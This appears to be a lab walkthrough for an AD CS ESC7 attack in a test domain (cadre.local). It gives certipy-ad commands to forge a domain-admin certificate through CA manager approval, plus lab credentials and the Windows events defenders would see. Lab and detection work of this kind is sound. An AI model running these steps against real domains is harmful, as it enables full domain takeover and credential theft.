# WT#055 — ESC7: CA Manager Approval

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | dc01 (192.168.77.10) |
| **Domain** | cadre.local |
| **CA** | cadre-CA |
| **Template** | User |
| **Starting Credential** | lead_engineering / L3ad_Eng1neer1ng! |
| **Tools Required** | certipy-ad |
| **Certifications** | ADCS |
| **MITRE ATT&CK** | T1649 |
| **Difficulty** | Medium |

## Prerequisites
- CA service running on dc01
- `lead_engineering` has `ManageCA` and `ManageCertificate` rights on cadre-CA
- `analyst_dfir` has Enroll on a template requiring CA Manager Approval

## Attack Steps

### 1. Enumerate CA permissions
```powershell
certipy-ad ca -ca cadre-CA -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 2. Submit certificate request as analyst_dfir
```powershell
certipy-ad req -ca cadre-CA -template User -upn chief_command@cadre.local -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```
Note the request ID from output.

### 3. Approve the request as lead_engineering
```powershell
certipy-ad ca -ca cadre-CA -approve -list -u lead_engineering@cadre.local -p 'L3ad_Eng1neer1ng!' -target 192.168.77.10
```

### 4. Retrieve the approved certificate
```powershell
certipy-ad req -ca cadre-CA -retrieve <REQUEST_ID> -u analyst_dfir@cadre.local -p 'An@lyst_DF1R!' -target 192.168.77.10
```

### 5. Authenticate as DA
```powershell
certipy-ad auth -pfx chief_command.pfx -dc-ip 192.168.77.10 -domain cadre.local
```

## Post-Exploitation Chain
ESC7 → Manager approval bypass → DA certificate → DCSync (WT#009) → Full domain compromise (cadre.local)

## Telemetry Verification
- **Event 4887**: Pending certificate request (analyst_dfir)
- **Event 4888**: Certificate denied
- **Event 4889** (two): Certificate issued after approval
- **Event 5136**: Request attributes written to AD
- **CA audit**: Certificate Services audit log shows approval by lead_engineering
## Status
CONFIGURED — CA cadre-CA running, lead_engineering has ManageCA+Issue permissions
